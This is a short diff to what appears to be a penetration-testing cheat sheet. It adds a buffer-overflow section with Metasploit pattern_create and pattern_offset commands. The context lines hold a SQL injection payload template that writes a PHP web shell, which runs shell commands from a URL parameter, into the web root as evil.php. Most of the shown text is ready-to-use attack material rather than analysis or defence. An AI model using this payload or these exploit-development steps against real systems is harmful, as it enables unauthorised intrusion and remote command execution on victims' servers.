@@ -308,7 +308,13 @@ On victim machine:
 <b>Shell upload:</b>
 
 	<[IP]>:<[PORT]>/<[URL]>.php?<[PARAMETER]>=999 union select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4,5,6 into OUTFILE '/var/www/html/evil.php'
-	
+
+# Buffer Overflow
+
+	/usr/share/metasploit-framework/tools/pattern_create.rb <[LENGTH]>
+
+	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -<[ADDRESS]>
+
 # Privilege Escalation
 
 <b>Vulnerable Services</b>
